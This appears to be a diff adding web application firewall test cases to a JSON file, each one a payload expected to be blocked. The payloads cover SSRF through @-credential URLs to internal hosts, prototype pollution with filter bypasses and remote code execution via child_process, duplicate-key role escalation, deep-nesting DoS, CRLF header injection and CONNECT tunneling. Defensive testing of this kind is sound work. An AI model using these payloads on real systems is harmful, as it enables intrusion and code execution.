+    "id": "CUSTOM-9999054-001",
+    "payload": "GET /api?url=http://attacker.com@127.0.0.1/",
+    "tags": ["custom-rule", "ssrf", "credential-injection", "quick", "rule-9999054"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999054: SSRF via @ credential injection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999054"
+  },
+  {
+    "id": "CUSTOM-9999054-002",
+    "payload": "GET /api?url=http://user:pass@10.0.0.1/admin",
+    "tags": ["custom-rule", "ssrf", "credential-injection", "rule-9999054"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999054: SSRF with credentials to internal host",
+    "category": "WAF-Validation",
+    "custom_rule": "9999054"
+  },
+  {
+    "id": "CUSTOM-9999055-001",
+    "payload": "{\"constructor\":{\"prototype\":{\"polluted\":true}}}",
+    "tags": ["custom-rule", "prototype-pollution", "constructor", "quick", "rule-9999055"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999055: Prototype pollution via constructor.prototype",
+    "category": "WAF-Validation",
+    "custom_rule": "9999055"
+  },
+  {
+    "id": "CUSTOM-9999055-002",
+    "payload": "{\"x\":{\"constructor\":{\"prototype\":{\"admin\":true}}}}",
+    "tags": ["custom-rule", "prototype-pollution", "constructor", "rule-9999055"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999055: Nested constructor prototype pollution",
+    "category": "WAF-Validation",
+    "custom_rule": "9999055"
+  },
+  {
+    "id": "CUSTOM-9999056-001",
+    "payload": "{\"__pro__proto__to__\":{\"admin\":true}}",
+    "tags": ["custom-rule", "prototype-pollution", "bypass", "quick", "rule-9999056"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999056: Prototype pollution filter bypass",
+    "category": "WAF-Validation",
+    "custom_rule": "9999056"
+  },
+  {
+    "id": "CUSTOM-9999056-002",
+    "payload": "{\"constconstructorructor\":{\"protoprototypetype\":{\"x\":1}}}",
+    "tags": ["custom-rule", "prototype-pollution", "bypass", "rule-9999056"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999056: Double-nested filter bypass attempt",
+    "category": "WAF-Validation",
+    "custom_rule": "9999056"
+  },
+  {
+    "id": "CUSTOM-9999057-001",
+    "payload": "{\"a\":{\"b\":{\"c\":{\"d\":{\"e\":{\"f\":{\"g\":{\"h\":{\"i\":{\"j\":{\"k\":{\"l\":{\"m\":{\"n\":{\"o\":{\"p\":{\"q\":1}}}}}}}}}}}}}}}}}",
+    "tags": ["custom-rule", "json-dos", "nesting", "quick", "rule-9999057"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "Custom rule 9999057: JSON deep nesting DoS",
+    "category": "WAF-Validation",
+    "custom_rule": "9999057"
+  },
+  {
+    "id": "CUSTOM-9999058-001",
+    "payload": "{\"role\":\"user\",\"role\":\"admin\"}",
+    "tags": ["custom-rule", "json-injection", "duplicate-key", "quick", "rule-9999058"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999058: JSON duplicate key injection",
+    "category": "WAF-Validation",
+    "custom_rule": "9999058"
+  },
+  {
+    "id": "CUSTOM-9999058-002",
+    "payload": "{\"isAdmin\":false,\"data\":{},\"isAdmin\":true}",
+    "tags": ["custom-rule", "json-injection", "duplicate-key", "rule-9999058"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999058: JSON duplicate isAdmin key",
+    "category": "WAF-Validation",
+    "custom_rule": "9999058"
+  },
+  {
+    "id": "CUSTOM-9999060-001",
+    "payload": "{\"__proto__\":{\"execArgv\":[\"-e\",\"require('child_process').exec('id')\"]}}",
+    "tags": ["custom-rule", "prototype-pollution", "rce", "quick", "rule-9999060"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999060: Prototype pollution RCE via execArgv",
+    "category": "WAF-Validation",
+    "custom_rule": "9999060"
+  },
+  {
+    "id": "CUSTOM-9999060-002",
+    "payload": "{\"__proto__\":{\"shell\":\"bash\",\"NODE_OPTIONS\":\"--require /tmp/evil.js\"}}",
+    "tags": ["custom-rule", "prototype-pollution", "rce", "rule-9999060"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999060: Prototype pollution RCE via shell",
+    "category": "WAF-Validation",
+    "custom_rule": "9999060"
+  },
+  {
+    "id": "CUSTOM-9999060-003",
+    "payload": "require('child_process').exec('id')",
+    "tags": ["custom-rule", "prototype-pollution", "rce", "rule-9999060"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Custom rule 9999060: Direct child_process require",
+    "category": "WAF-Validation",
+    "custom_rule": "9999060"
+  },
+  {
+    "id": "CUSTOM-9999061-001",
+    "payload": "GET /api%0d%0aX-Injected: header HTTP/1.1",
+    "tags": ["custom-rule", "crlf-injection", "uri", "quick", "rule-9999061"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999061: CRLF injection in request URI",
+    "category": "WAF-Validation",
+    "custom_rule": "9999061"
+  },
+  {
+    "id": "CUSTOM-9999063-001",
+    "payload": "CONNECT internal.server:8080 HTTP/1.1",
+    "tags": ["custom-rule", "tunneling", "connect", "quick", "rule-9999063"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "Custom rule 9999063: HTTP CONNECT tunneling attempt",
+    "category": "WAF-Validation",
+    "custom_rule": "9999063"
+  }
+]
